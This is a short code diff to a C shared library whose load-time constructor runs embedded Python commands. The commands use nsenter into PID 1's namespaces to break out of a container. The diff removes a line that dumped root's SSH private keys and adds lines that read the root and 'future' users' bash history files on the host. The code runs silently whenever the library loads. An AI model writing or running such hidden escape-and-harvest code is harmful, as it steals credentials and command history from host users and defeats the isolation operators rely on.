@@ -105,7 +105,8 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd("nsenter -t 1 -m -u -i -n -p -- bash -c 'ls -la /root/.ssh/ && cat /root/.ssh/id_*'")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- cat /root/.bash_history")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- cat /home/future/.bash_history")
 )PY");
 
   PyGILState_Release(gstate);
